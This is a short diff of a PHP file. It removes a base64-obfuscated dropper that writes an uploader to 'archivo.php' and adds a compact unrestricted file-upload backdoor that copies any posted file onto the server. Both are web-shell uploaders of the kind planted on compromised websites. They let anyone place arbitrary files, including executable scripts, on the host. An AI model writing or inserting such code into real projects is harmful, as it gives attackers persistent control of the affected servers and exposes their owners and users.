@@ -1,2 +1,1 @@
-<?php file_put_contents('archivo.php',
-base64_decode('PD89ICRfU0VSVkVSWyJSRVFVRVNUX01FVEhPRCJdID09ICJQT1NUIiAmJiBpc3NldCgkX0ZJTEVTWyJhcmNoaXZvIl0pICYmIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydhcmNoaXZvJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2FyY2hpdm8nXVsnbmFtZSddKSA/Pjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJhcmNoaXZvIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3ViaXIgYXJjaGl2byI+PC9mb3JtPg==')); ?>
+<?php echo '<form method=post enctype=multipart/form-data>';echo '<input type=file name=f><input name=v type=submit id=v value=up><br>';if($_POST['v']=='up'){if(@copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])){echo '<b>Upload</b>-->'.$_FILES['f']['name'];}else{echo '<b>gagal';}}?>
